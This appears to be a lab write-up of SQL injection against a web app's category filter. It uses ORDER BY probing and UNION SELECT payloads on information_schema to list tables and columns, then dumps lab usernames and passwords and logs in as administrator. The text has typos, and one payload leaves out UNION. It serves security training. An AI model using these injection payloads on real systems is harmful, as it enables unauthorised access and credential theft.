
## Lab Description :

![image]()

## Solution :

Most database types (with the notable exception of Oracle) have a set of views called the `information schema` which provide information about the database.

You can query `information_schema.tables` to list the tables in the database:

```sql
SELECT * FROM information_schema.tables
```
O/P shows the columns present in it

```sql
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

## Steps

![image]()


#### Determine the number of columns -

**ORDER BY 3**

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 3--
```

![image]()

#### Determine wich column contains text data

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' SELECT 'abc','def'--
```
Both the columns contain text data.

![image]()

### List the database contents

#### List tables -

From the information schema tables, there are some default columns.

![image]()


```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT table_name,NULL FROM information_schema.tables--
```

We get list of all the available tables

![image]()

![image]()


#### List columns -

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_fhlhke'--
```

We get these columns

![image]()

columns - `username_yoqrkg` & `password_btqiad`

#### Retreive information from the columns username_yoqrkg & password_btqiad from the table users_fhlhke -


```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT username_yoqrkg,password_btqiad FROM users_fhlhke--
```
Now we get the username and password of all users.

![image]()

administrator - `a80zs35scefit206tw5s`
carlos - `hfs0tq3xzvdz2awja6bn`
wiener - `7qsyjg4sbbxt16easf7l`

Now login as administrator,

![image]()

